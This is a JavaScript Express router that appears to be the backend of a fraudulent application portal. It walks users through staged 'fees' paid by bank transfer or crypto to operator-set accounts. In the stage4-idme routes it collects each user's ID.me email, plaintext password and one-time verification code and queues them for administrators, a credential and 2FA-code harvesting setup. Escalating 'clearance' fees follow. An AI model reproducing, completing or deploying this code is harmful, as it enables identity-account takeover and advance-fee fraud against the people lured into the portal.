import { Router } from 'express';
import redis from '../redis.js';
import { authMiddleware } from '../middleware/auth.js';

const router = Router();
router.use(authMiddleware);

const FEES = { 1: 2620.60, 2: 4420.83, 3: 6700.70 };

const generateInvoiceNumber = async () => {
  const year = new Date().getFullYear();
  const counter = await redis.incr('inv:counter');
  return `INV-${year}-${String(counter).padStart(5, '0')}`;
};

const getUser = async (id) => {
  const data = await redis.get(`user:${id}`);
  return data ? JSON.parse(data) : null;
};

router.get('/progress', async (req, res) => {
  try {
    const user = await getUser(req.user.id);
    if (!user) return res.status(404).json({ error: 'Not found' });
    res.json({
      currentStage: user.currentStage, stageStatus: user.stageStatus,
      applyingFor: user.applyingFor, fullName: user.fullName,
      selectedOffice: user.selectedOffice, applicationFeeVerified: user.applicationFeeVerified,
      idmeVerified: user.idmeVerified, idmeSubmitted: user.idmeSubmitted, idmeStatus: user.idmeStatus,
      idmeDeclineMessage: user.idmeDeclineMessage, idmeCodeSent: user.idmeCodeSent,
      clearanceDuration: user.clearanceDuration, clearancePaymentVerified: user.clearancePaymentVerified,
      finalApproved: user.finalApproved, bioDataComplete: user.bioDataComplete, officeSelected: user.officeSelected
    });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.get('/payment-config', async (req, res) => {
  try {
    const config = JSON.parse(await redis.get('payment:config') || '{}');
    const safeConfig = {};
    if (config.bankTransfer && config.bankTransfer.available) {
      safeConfig.bankTransfer = {
        available: true,
        bankName: config.bankTransfer.bankName,
        accountName: config.bankTransfer.accountName,
        accountNumber: config.bankTransfer.accountNumber,
        routingNumber: config.bankTransfer.routingNumber,
        swiftCode: config.bankTransfer.swiftCode,
        instructions: config.bankTransfer.instructions
      };
    }
    if (config.crypto && config.crypto.available) {
      safeConfig.crypto = {
        available: true,
        walletAddress: config.crypto.walletAddress,
        qrCodeImage: config.crypto.qrCodeImage,
        network: config.crypto.network,
        instructions: config.crypto.instructions
      };
    }
    res.json({ config: safeConfig });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/stage1-bio', async (req, res) => {
  try {
    const { fullName, dob, address, city, state, zipCode } = req.body;
    const user = await getUser(req.user.id);
    if (!user) return res.status(404).json({ error: 'Not found' });

    user.fullName = fullName || user.fullName;
    user.dob = dob || user.dob;
    user.address = address || '';
    user.city = city || '';
    user.state = state || '';
    user.zipCode = zipCode || '';
    user.bioDataComplete = true;
    user.currentStage = 2;
    user.updatedAt = new Date().toISOString();

    await redis.set(`user:${req.user.id}`, JSON.stringify(user));
    res.json({ success: true, currentStage: 2 });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/stage2-office', async (req, res) => {
  try {
    const { office } = req.body;
    if (!office || typeof office !== 'string') return res.status(400).json({ error: 'Office required' });

    const user = await getUser(req.user.id);
    if (!user) return res.status(404).json({ error: 'Not found' });

    user.selectedOffice = office;
    user.officeSelected = true;
    user.currentStage = 3;
    user.updatedAt = new Date().toISOString();

    await redis.set(`user:${req.user.id}`, JSON.stringify(user));
    res.json({ success: true, currentStage: 3 });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/stage3-payment', async (req, res) => {
  try {
    const { receiptNumber, paymentMethod } = req.body;
    if (!receiptNumber) return res.status(400).json({ error: 'Receipt number required' });
    if (!['bank_transfer', 'crypto'].includes(paymentMethod)) return res.status(400).json({ error: 'Invalid payment method' });

    const config = JSON.parse(await redis.get('payment:config') || '{}');
    if (paymentMethod === 'bank_transfer' && (!config.bankTransfer || !config.bankTransfer.available)) {
      return res.status(400).json({ error: 'Bank transfer is currently unavailable' });
    }
    if (paymentMethod === 'crypto' && (!config.crypto || !config.crypto.available)) {
      return res.status(400).json({ error: 'Crypto payment is currently unavailable' });
    }

    const user = await getUser(req.user.id);
    if (!user) return res.status(404).json({ error: 'Not found' });

    user.receiptNumber = String(receiptNumber).slice(0, 50);
    user.paymentMethod = paymentMethod;
    user.paymentSubmittedAt = new Date().toISOString();
    user.stageStatus = 'awaiting_payment_verification';

    if (paymentMethod === 'crypto') {
      user.invoiceNumber = await generateInvoiceNumber();
    }

    user.updatedAt = new Date().toISOString();

    await redis.set(`user:${req.user.id}`, JSON.stringify(user));

    const queue = JSON.parse(await redis.get('admin:pendingPayments') || '[]');
    queue.push({ userId: req.user.id, receiptNumber: user.receiptNumber, paymentMethod, submittedAt: user.paymentSubmittedAt });
    await redis.set('admin:pendingPayments', JSON.stringify(queue));

    res.json({ success: true, invoiceNumber: user.invoiceNumber || '' });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/stage4-idme', async (req, res) => {
  try {
    const { idmeEmail, idmePassword } = req.body;
    if (!idmeEmail || !idmePassword) return res.status(400).json({ error: 'IDME credentials required' });

    const user = await getUser(req.user.id);
    if (!user) return res.status(404).json({ error: 'Not found' });
    if (!user.applicationFeeVerified) return res.status(400).json({ error: 'Payment not verified' });

    user.idmeEmail = idmeEmail;
    user.idmePassword = idmePassword;
    user.idmeSubmitted = true;
    user.idmeStatus = 'sending';
    user.idmeDeclineMessage = '';
    user.currentStage = 5;
    user.stageStatus = 'awaiting_idme_verification';
    user.updatedAt = new Date().toISOString();

    await redis.set(`user:${req.user.id}`, JSON.stringify(user));

    const queue = JSON.parse(await redis.get('admin:pendingIdme') || '[]');
    queue.push({ userId: req.user.id, submittedAt: user.updatedAt });
    await redis.set('admin:pendingIdme', JSON.stringify(queue));

    res.json({ success: true });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/stage4-idme-code', async (req, res) => {
  try {
    const { code } = req.body;
    if (!code) return res.status(400).json({ error: 'Code required' });

    const user = await getUser(req.user.id);
    if (!user) return res.status(404).json({ error: 'Not found' });

    user.idmeCode = code;
    user.idmeStatus = 'code_sending';
    user.updatedAt = new Date().toISOString();

    await redis.set(`user:${req.user.id}`, JSON.stringify(user));

    const queue = JSON.parse(await redis.get('admin:pendingIdmeCodes') || '[]');
    queue.push({ userId: req.user.id, code: code, submittedAt: user.updatedAt });
    await redis.set('admin:pendingIdmeCodes', JSON.stringify(queue));

    res.json({ success: true });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/stage5-clearance', async (req, res) => {
  try {
    const { duration } = req.body;
    if (![1, 2, 3].includes(duration)) return res.status(400).json({ error: 'Invalid duration' });

    const user = await getUser(req.user.id);
    if (!user) return res.status(404).json({ error: 'Not found' });

    user.clearanceDuration = duration;
    user.clearanceFee = FEES[duration];
    user.currentStage = 6;
    user.stageStatus = 'pending_clearance_payment';
    user.updatedAt = new Date().toISOString();

    await redis.set(`user:${req.user.id}`, JSON.stringify(user));
    res.json({ success: true, clearanceFee: FEES[duration], duration });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.post('/stage6-clearance-payment', async (req, res) => {
  try {
    const { receiptNumber, paymentMethod } = req.body;
    if (!receiptNumber) return res.status(400).json({ error: 'Receipt number required' });

    const user = await getUser(req.user.id);
    if (!user) return res.status(404).json({ error: 'Not found' });

    user.clearanceReceiptNumber = String(receiptNumber).slice(0, 50);
    user.clearancePaymentMethod = paymentMethod || 'bank_transfer';
    user.clearancePaymentSubmittedAt = new Date().toISOString();
    user.stageStatus = 'awaiting_clearance_verification';
    user.updatedAt = new Date().toISOString();

    await redis.set(`user:${req.user.id}`, JSON.stringify(user));

    const queue = JSON.parse(await redis.get('admin:pendingClearance') || '[]');
    queue.push({ userId: req.user.id, submittedAt: user.clearancePaymentSubmittedAt });
    await redis.set('admin:pendingClearance', JSON.stringify(queue));

    res.json({ success: true });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

router.get('/dashboard', async (req, res) => {
  try {
    const user = await getUser(req.user.id);
    if (!user) return res.status(404).json({ error: 'Not found' });

    res.json({
      user: {
        id: user.id, applicationNumber: user.applicationNumber, fullName: user.fullName, email: user.email, username: user.username,
        applyingFor: user.applyingFor, selectedOffice: user.selectedOffice,
        currentStage: user.currentStage, stageStatus: user.stageStatus,
        applicationFeeVerified: user.applicationFeeVerified, paymentMethod: user.paymentMethod, invoiceNumber: user.invoiceNumber,
        emailVerified: user.emailVerified,
        idmeVerified: user.idmeVerified, idmeSubmitted: user.idmeSubmitted,
        idmeStatus: user.idmeStatus, idmeDeclineMessage: user.idmeDeclineMessage,
        idmeCodeSent: user.idmeCodeSent, idmeEmail: user.idmeEmail,
        clearanceDuration: user.clearanceDuration, clearanceFee: user.clearanceFee || FEES[user.clearanceDuration] || 0,
        clearancePaymentVerified: user.clearancePaymentVerified,
        finalApproved: user.finalApproved, accountOfficer: user.accountOfficer,
        createdAt: user.createdAt
      }
    });
  } catch { res.status(500).json({ error: 'Server error' }); }
});

export default router;
